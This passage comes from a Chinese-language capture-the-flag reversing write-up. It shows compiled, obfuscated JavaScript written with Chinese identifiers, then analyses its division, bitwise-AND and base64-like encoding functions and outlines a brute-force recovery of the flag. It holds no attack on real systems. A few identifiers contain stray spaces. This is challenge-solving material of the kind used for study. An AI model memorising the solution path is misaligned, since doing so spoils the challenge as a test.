class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">獲取 = 對象 =&gt; 域 =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> 對象[域];</span><br><span class="line">&#125;; <span class="comment">/*&quot;============&quot;*/</span></span><br><span class="line"><span class="keyword">var</span> 營 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">營 = 日 =&gt; 鑫 =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> _ans1 = 日 % 鑫;</span><br><span class="line">    <span class="keyword">const</span> _ans2 = 日 - _ans1;</span><br><span class="line">    <span class="keyword">var</span> 戌卯 = _ans2;</span><br><span class="line">    <span class="keyword">const</span> _ans3 = 戌卯 / 鑫;</span><br><span class="line">    <span class="keyword">var</span> 庚巳 = _ans3;</span><br><span class="line">    <span class="keyword">return</span> 庚巳;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> 削 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">削 = 日 =&gt; 鑫 =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> 命 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> 恩 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> 戊乙 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (日 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            戊乙 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> 午酉 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (鑫 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            午酉 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans4 = 戊乙 &amp;&amp; 午酉;</span><br><span class="line">        <span class="keyword">var</span> 酉癸 = _ans4;</span><br><span class="line">        <span class="keyword">if</span> (酉癸 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans5 = 日 % <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> 辛甲 = _ans5;</span><br><span class="line">        <span class="keyword">var</span> 甲二 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (辛甲 == <span class="number">1</span>) &#123;</span><br><span class="line">            甲二 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans6 = 鑫 % <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> 二辛 = _ans6;</span><br><span class="line">        <span class="keyword">var</span> 午庚 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (二辛 == <span class="number">1</span>) &#123;</span><br><span class="line">            午庚 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans7 = 甲二 &amp;&amp; 午庚;</span><br><span class="line">        <span class="keyword">var</span> 巳己 = _ans7;</span><br><span class="line">        <span class="keyword">if</span> (巳己) &#123;</span><br><span class="line">            <span class="keyword">const</span> _ans8 = 命 + 恩;</span><br><span class="line">            命 = _ans8;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans9 = 營(日)(<span class="number">2</span>);</span><br><span class="line">        日 = _ans9;</span><br><span class="line">        <span class="keyword">const</span> _ans10 = 營(鑫)(<span class="number">2</span>);</span><br><span class="line">        鑫 = _ans10;</span><br><span class="line">        <span class="keyword">const</span> _ans11 = 恩 * <span class="number">2</span>;</span><br><span class="line">        恩 = _ans11;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> 命;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> 斐 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">斐 = 竺 =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> 呼 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans12 = 笆.length;</span><br><span class="line">        <span class="keyword">var</span> 巳酉 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (呼 &lt; _ans12) &#123;</span><br><span class="line">            巳酉 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (巳酉 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans13 = 獲取(笆)(呼);</span><br><span class="line">        <span class="keyword">var</span> 乙丁 = _ans13;</span><br><span class="line">        <span class="keyword">if</span> (乙丁 == 竺) &#123;</span><br><span class="line">            <span class="keyword">return</span> 呼;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans14 = 呼 + <span class="number">1</span>;</span><br><span class="line">        呼 = _ans14;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> 天 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">天 = 食 =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> 返 = [];</span><br><span class="line">    <span class="keyword">var</span> 呼 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans15 = 食.length;</span><br><span class="line">        <span class="keyword">var</span> 寅二 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (呼 &lt; _ans15) &#123;</span><br><span class="line">            寅二 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (寅二 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> 表 = [];</span><br><span class="line">        <span class="keyword">const</span> _ans16 = 獲取(食)(呼);</span><br><span class="line">        <span class="keyword">var</span> 辰丁 = _ans16;</span><br><span class="line">        <span class="keyword">const</span> _ans17 = 斐(辰丁);</span><br><span class="line">        <span class="keyword">var</span> 丙戊 = _ans17;</span><br><span class="line">        <span class="keyword">const</span> _ans18 = 呼 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">var</span> 丙甲 = _ans18;</span><br><span class="line">        <span class="keyword">const</span> _ans19 = 獲取(食)(丙甲);</span><br><span class="line">        <span class="keyword">var</span> 丁 申 = _ans19;</span><br><span class="line">        <span class="keyword">const</span> _ans20 = 斐(丁申);</span><br><span class="line">        <span class="keyword">var</span> 午申 = _ans20;</span><br><span class="line">        <span class="keyword">const</span> _ans21 = 呼 + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> 乙庚 = _ans21;</span><br><span class="line">        <span class="keyword">const</span> _ans22 = 獲取(食)(乙庚);</span><br><span class="line">        <span class="keyword">var</span> 地戌 = _ans22;</span><br><span class="line">        <span class="keyword">const</span> _ans23 = 斐(地戌);</span><br><span class="line">        <span class="keyword">var</span> 丁亥 = _ans23;</span><br><span class="line">        <span class="keyword">const</span> _ans24 = 呼 + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">var</span> 二卯 = _ans24;</span><br><span class="line">        <span class="keyword">const</span> _ans25 = 獲取(食)(二卯);</span><br><span class="line">        <span class="keyword">var</span> 寅酉 = _ans25;</span><br><span class="line">        <span class="keyword">const</span> _ans26 = 斐(寅酉);</span><br><span class="line">        <span class="keyword">var</span> 支丙 = _ans26;</span><br><span class="line">        表.push(丙戊, 午申, 丁亥, 支丙);</span><br><span class="line">        <span class="keyword">const</span> _ans27 = 表[<span class="number">1</span> - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> 己辛 = _ans27;</span><br><span class="line">        <span class="keyword">const</span> _ans28 = 己辛 * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">var</span> 酉支 = _ans28;</span><br><span class="line">        <span class="keyword">const</span> _ans29 = 表[<span class="number">2</span> - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> 乙酉 = _ans29;</span><br><span class="line">        <span class="keyword">const</span> _ans30 = 營(乙酉)(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">const</span> _ans31 = 酉支 + _ans30;</span><br><span class="line">        <span class="keyword">var</span> 丁壬 = _ans31;</span><br><span class="line">        返.push(丁壬);</span><br><span class="line">        <span class="keyword">const</span> _ans32 = 表[<span class="number">2</span> - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> 子甲 = _ans32;</span><br><span class="line">        <span class="keyword">const</span> _ans33 = 削(子甲)(<span class="number">15</span>);</span><br><span class="line">        <span class="keyword">var</span> 丁巳 = _ans33;</span><br><span class="line">        <span class="keyword">const</span> _ans34 = 丁巳 * <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> 壬己 = _ans34;</span><br><span class="line">        <span class="keyword">const</span> _ans35 = 表[<span class="number">3</span> - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> 辛辛 = _ans35;</span><br><span class="line">        <span class="keyword">const</span> _ans36 = 營(辛辛)(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">const</span> _ans37 = 壬己 + _ans36;</span><br><span class="line">        <span class="keyword">var</span> 支己 = _ans37;</span><br><span class="line">        返.push(支己);</span><br><span class="line">        <span class="keyword">const</span> _ans38 = 表[<span class="number">3</span> - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> 亥巳 = _ans38;</span><br><span class="line">        <span class="keyword">const</span> _ans39 = 削(亥巳)(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">var</span> 地丙 = _ans39;</span><br><span class="line">        <span class="keyword">const</span> _ans40 = 地丙 * <span class="number">64</span>;</span><br><span class="line">        <span class="keyword">var</span> 申 戌 = _ans40;</span><br><span class="line">        <span class="keyword">const</span> _ans41 = 表[<span class="number">4</span> - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> 乙卯 = _ans41;</span><br><span class="line">        <span class="keyword">const</span> _ans42 = 削(乙卯)(<span class="number">63</span>);</span><br><span class="line">        <span class="keyword">const</span> _ans43 = 申戌 + _ans42;</span><br><span class="line">        <span class="keyword">var</span> 壬寅 = _ans43;</span><br><span class="line">        返.push(壬寅);</span><br><span class="line">        <span class="keyword">const</span> _ans44 = 呼 + <span class="number">4</span>;</span><br><span class="line">        呼 = _ans44;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 遣 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 呼 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans45 = 返.length;</span><br><span class="line">        <span class="keyword">var</span> 辛未 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (呼 &lt; _ans45) &#123;</span><br><span class="line">            辛未 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (辛未 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans46 = 獲取(返)(呼);</span><br><span class="line">        <span class="keyword">var</span> 戊丙 = _ans46;</span><br><span class="line">        <span class="keyword">if</span> (戊丙 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans47 = 始碼(戊丙);</span><br><span class="line">        <span class="keyword">const</span> _ans48 = 遣 + _ans47;</span><br><span class="line">        遣 = _ans48;</span><br><span class="line">        <span class="keyword">const</span> _ans49 = 呼 + <span class="number">1</span>;</span><br><span class="line">        呼 = _ans49;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> 遣;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> _ans50 = 子字(師)(<span class="number">463</span>)(<span class="number">527</span>);</span><br><span class="line"><span class="keyword">var</span> 桐 = _ans50;</span><br><span class="line"><span class="keyword">const</span> _ans51 = 天(斯);</span><br><span class="line"><span class="keyword">var</span> 系 = _ans51;</span><br><span class="line"><span class="keyword">const</span> _ans52 = 天(啟);</span><br><span class="line"><span class="keyword">var</span> 啟 = _ans52;</span><br><span class="line"><span class="keyword">var</span> 涅 = <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line"><span class="keyword">var</span> 禱 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">禱 = 食 =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> _ans53 = 食.length;</span><br><span class="line">    <span class="keyword">var</span> 連 = _ans53;</span><br><span class="line">    <span class="keyword">const</span> _ans54 = !連;</span><br><span class="line">    <span class="keyword">var</span> 未丑 = _ans54;</span><br><span class="line">    <span class="keyword">if</span> (未丑) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 紀元 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 呼 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> 申壬 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (呼 &lt; 連) &#123;</span><br><span class="line">            申壬 = <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (申壬 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans55 = 字址(食)(呼);</span><br><span class="line">        日 = _ans55;</span><br><span class="line">        <span class="keyword">var</span> 鑫 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> 谷 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">const</span> _ans56 = 連 - 呼;</span><br><span class="line">        <span class="keyword">var</span> 己酉 = _ans56;</span><br><span class="line">        <span class="keyword">if</span> (己酉 &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> _ans57 = 呼 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">var</span> 支辛 = _ans57;</span><br><span class="line">            <span class="keyword">const</span> _ans58 = 字址(食)(支辛);</span><br><span class="line">            鑫 = _ans58;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans59 = 連 - 呼;</span><br><span class="line">        <span class="keyword">var</span> 地巳 = _ans59;</span><br><span class="line">        <span class="keyword">if</span> (地巳 &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> _ans60 = 呼 + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">var</span> 乙乙 = _ans60;</span><br><span class="line">            <span class="keyword">const</span> _ans61 = 字址(食)(乙乙);</span><br><span class="line">            谷 = _ans61;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> _ans62 = 營(日)(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> 丙癸 = _ans62;</span><br><span class="line">        <span class="keyword">const</span> _ans63 = 削(日)(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">var</span> 亥十 = _ans63;</span><br><span class="line">        <span class="keyword">const</span> _ans64 = 亥十 * <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> 乙己 = _ans64;</span><br><span class="line">        <span class="keyword">const</span> _ans65 = 營(鑫)(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">const</span> _ans66 = 乙己 + _ans65;</span><br><span class="line">        <span class="keyword">var</span> 卯戌 = _ans66;</span><br><span class="line">        <span class="keyword">const</span> _ans67 = 型(丙癸)(卯戌);</span><br><span class="line">        <span class="keyword">const</span> _ans68 = 紀元 + _ans67;</span><br><span class="line">        紀元 = _ans68;</span><br><span class="line">        <span class="keyword">const</span> _ans69 = 削(鑫)(<span class="number">15</span>);</span><br><span class="line">        <span class="keyword">var</span> 戌戌 = _ans69;</span><br><span class="line">        <span class="keyword">const</span> _ans70 = 戌戌 * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">var</span> 乙己七 = _ans70;</span><br><span class="line">        <span class="keyword">const</span> _ans71 = 營(谷)(<span class="number">64</span>);</span><br><span class="line">        <span class="keyword">const</span> _ans72 = 乙己七 + _ans71;</span><br><span class="line">        <span class="keyword">var</span> 戌巳 = _ans72;</span><br><span class="line">        <span class="keyword">const</span> _ans73 = 削(谷)(<span class="number">63</span>);</span><br><span class="line">        <span class="keyword">var</span> 丁午 = _ans73;</span><br><span class="line">        <span class="keyword">const</span> _ans74 = 型(戌巳)(丁午);</span><br><span class="line">        <span class="keyword">const</span> _ans75 = 紀元 + _ans74;</span><br><span class="line">        紀元 = _ans75;</span><br><span class="line">        <span class="keyword">const</span> _ans76 = 呼 + <span class="number">3</span>;</span><br><span class="line">        呼 = _ans76;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> _ans77 = 連 % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">var</span> 辰申 = _ans77;</span><br><span class="line">    <span class="keyword">if</span> (辰申 == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans78 = 紀元 + <span class="string">&quot;等於&quot;</span>;</span><br><span class="line">        紀元 = _ans78;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> 紀元;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> _ans79 = 天(歷);</span><br><span class="line"><span class="keyword">var</span> 歷 = _ans79;</span><br><span class="line"><span class="keyword">const</span> _ans80 = 天(魠);</span><br><span class="line"><span class="keyword">var</span> 魠 = _ans80;</span><br><span class="line"><span class="keyword">var</span> 型 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">型 = 和 =&gt; 宇 =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> _ans81 = <span class="number">165</span> + 和;</span><br><span class="line">    <span class="keyword">const</span> _ans82 = 啟 + _ans81;</span><br><span class="line">    <span class="keyword">var</span> 巳支 = _ans82;</span><br><span class="line">    <span class="keyword">const</span> _ans83 = 巳支 + 魠;</span><br><span class="line">    <span class="keyword">var</span> 申午 = _ans83;</span><br><span class="line">    <span class="keyword">const</span> _ans84 = 獲取(桐)(宇);</span><br><span class="line">    <span class="keyword">const</span> _ans85 = 申午 + _ans84;</span><br><span class="line">    <span class="keyword">var</span> 二酉 = _ans85;</span><br><span class="line">    <span class="keyword">return</span> 二酉;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> 希依 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">希依 = 祈 =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> _ans86 = 禱(祈);</span><br><span class="line">    命 = _ans86;</span><br><span class="line">    <span class="keyword">var</span> _ans87 = <span class="string">&quot;結果&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> _ans88 = 命;</span><br><span class="line">    <span class="keyword">var</span> _ans89 = 歷;</span><br><span class="line">    <span class="built_in">console</span>.log(_ans87, _ans88, _ans89);</span><br><span class="line">    <span class="keyword">if</span> (命 == 秘旗) &#123;</span><br><span class="line">        <span class="keyword">var</span> _ans90 = <span class="string">&quot;正解&quot;</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(_ans90);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> 玲瓏 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">玲瓏 = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _ans91 = 託;</span><br><span class="line">    <span class="built_in">console</span>.log(_ans91);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> 殼 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">殼 = 入 =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> _ans92 = 始於(入)(<span class="string">&quot;蛵煿 &quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> 丁辰 = _ans92;</span><br><span class="line">    <span class="keyword">if</span> (丁辰) &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans93 = 字子(入)(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">var</span> 地辛 = _ans93;</span><br><span class="line">        <span class="keyword">const</span> _ans94 = 希依(地辛);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (入 == <span class="string">&quot;助&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> _ans95 = 玲瓏();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> _ans96 = <span class="string">&quot;指令「&quot;</span> + 入;</span><br><span class="line">            <span class="keyword">var</span> 丙丁 = _ans96;</span><br><span class="line">            <span class="keyword">const</span> _ans97 = 丙丁 + <span class="string">&quot;」不存在\n&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> 辛午 = _ans97;</span><br><span class="line">            <span class="keyword">const</span> _ans98 = 輸出(辛午);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> _ans99 = 輸出(涅);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> 殼始 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">殼始 = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _ans100 = 大;</span><br><span class="line">    <span class="built_in">console</span>.log(_ans100);</span><br><span class="line">    <span class="keyword">const</span> _ans101 = 輸出(涅);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> _ans102 = 殼始();</span><br><span class="line"><span class="keyword">const</span> _ans103 = 聽寫(系)(殼);</span><br></pre></td></tr></table></figure>

<p>觀察 compile 後的 code 內容，稍微解析各個 function 的內容:<br><code>恆常</code>為定義 const variable，可以看到<code>秘旗</code>就是加密過後的 flag，其餘先保留。<br><code>鑿字秘術</code>與<code>交互秘術</code>都是一些內建函式的改寫，可以直接略過。<br>剩下是自定義函式，一樣可以略過。</p>
<p>這時候從尾部找尋秘旗，往前對照發現其是對應<code>禱(祈)</code>這個函式，這時候對這個單一函數進行解析整理:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 禱=<span class="function"><span class="params">_</span>=&gt;</span>&#123;&#125;;禱=食=&gt;&#123;</span><br><span class="line"><span class="keyword">if</span> (!食.length)&#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;;</span><br><span class="line"><span class="keyword">var</span> 紀元=<span class="string">&quot;&quot;</span>;<span class="keyword">var</span> 呼=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;<span class="keyword">var</span> 申壬=<span class="literal">false</span>;<span class="keyword">if</span> (呼&lt;連)&#123;申壬=<span class="literal">true</span>;&#125;;<span class="keyword">if</span> (申壬==<span class="number">0</span>)&#123;<span class="keyword">break</span>;&#125;;</span><br><span class="line">日=字址(食)(呼);</span><br><span class="line"><span class="keyword">var</span> 鑫=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> 谷=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (連-呼&gt;=<span class="number">2</span>)&#123;鑫=字址(食)(呼+<span class="number">1</span>);&#125;;</span><br><span class="line"><span class="keyword">if</span> (連-呼&gt;<span class="number">2</span>)&#123;谷=字址(食)(呼+<span class="number">2</span>);&#125;;</span><br><span class="line">紀元=紀元+型(營(日)(<span class="number">4</span>))(削(日)(<span class="number">3</span>)*<span class="number">16</span>+營(鑫)(<span class="number">16</span>));</span><br><span class="line">紀元=紀元+型(削(鑫)(<span class="number">15</span>)*<span class="number">4</span>+營(谷)(<span class="number">64</span>))(削(谷)(<span class="number">63</span>));</span><br><span class="line">呼=呼+<span class="number">3</span>;&#125;</span><br><span class="line"><span class="keyword">if</span> (連%<span class="number">3</span>==<span class="number">1</span>)&#123;紀元=紀元+<span class="string">&quot;等於&quot;</span>;&#125;;</span><br><span class="line"><span class="keyword">return</span> 紀元;&#125;</span><br></pre></td></tr></table></figure>

<p>在編輯器<code>Ctrl+F</code>搜尋發現<code>食</code>沒有被定義僅被呼叫，推測<code>食</code>就是 flag，而<code>日</code>、<code>鑫</code>、<code>谷</code>則為三個一組的 flag 呼叫。</p>
<p>先來分析<code>營</code>和<code>削</code>函式:<br><code>營</code>相對簡單，<code>營(a)(b)=(a//b)</code><br><code>削</code>的部分，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 削=<span class="function"><span class="params">_</span>=&gt;</span>&#123;&#125;;</span><br><span class="line">削=日=&gt;鑫=&gt;&#123;</span><br><span class="line"><span class="keyword">var</span> 命=<span class="number">0</span>;<span class="keyword">var</span> 恩=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> 戊乙=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (日&gt;<span class="number">0</span>)&#123;戊乙=<span class="literal">true</span>;&#125;;</span><br><span class="line"><span class="keyword">var</span> 午酉=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (鑫&gt;<span class="number">0</span>)&#123;午酉=<span class="literal">true</span>;&#125;;</span><br><span class="line"><span class="keyword">if</span> (戊乙&amp;&amp;午酉==<span class="number">0</span>)&#123;<span class="keyword">break</span>;&#125;;</span><br><span class="line"><span class="keyword">var</span> 甲二=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (日%<span class="number">2</span>==<span class="number">1</span>)&#123;甲二=<span class="literal">true</span>;&#125;;</span><br><span class="line"><span class="keyword">var</span> 午庚=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (鑫%<span class="number">2</span>==<span class="number">1</span>)&#123;午庚=<span class="literal">true</span>;&#125;;</span><br><span class="line"><span class="keyword">if</span> (甲二&amp;&amp;午庚)&#123;命=命+恩;&#125;;</span><br><span class="line">日=營(日)(<span class="number">2</span>);鑫=營(鑫)(<span class="number">2</span>);恩=恩*<span class="number">2</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> 命;&#125;</span><br></pre></td></tr></table></figure>

<p>可得<code>削(a)(b)=(a&gt;0&amp;&amp;b&gt;0)?(a&amp;b):0</code></p>
<p>再來看<code>型</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 型=<span class="function"><span class="params">_</span>=&gt;</span>&#123;&#125;;</span><br><span class="line">型=和=&gt;宇=&gt;&#123;<span class="keyword">return</span>啟+(<span class="number">165</span>+和)+魠+獲取(桐)(宇);&#125;</span><br></pre></td></tr></table></figure>

<p>上面可知<code>和</code>及<code>宇</code>為<code>禱</code>內部呼叫之參數，皆為數字，<code>啟</code>、<code>魠</code>為外部傳入，不影響<code>禱</code>所求<code>日</code>、<code>鑫</code>、<code>谷</code>內容</p>
<p>而<code>桐=子字(師)(463)(527)</code>(從前面的<code>交互秘術</code>可知是 substring 的意思)，可得<code>桐=&#39;明故五月渡瀘深入不毛今南方巳定兵甲已足當獎率三軍北碇中原庶竭駑鈍攘除奸兇興複漢室還于舊都此臣所以報先帝而忠陛下之職分也至於斟酌損&#39;</code></p>
<p>故<code>秘旗</code>重複單位<code>\x1b[38:5:181m獎</code>即為單一<code>型</code>所生，<code>(165+和)</code>為數字，<code>獲取(桐)(宇)</code>為字串中字元<br>所以<code>啟=\x1b[38:5:</code>，<code>魠=m</code>，無須逆向。</p>
<p>寫 code 爆搜出<code>日</code>、<code>鑫</code>、<code>谷</code>對應<code>秘旗</code>內容即可。</p>
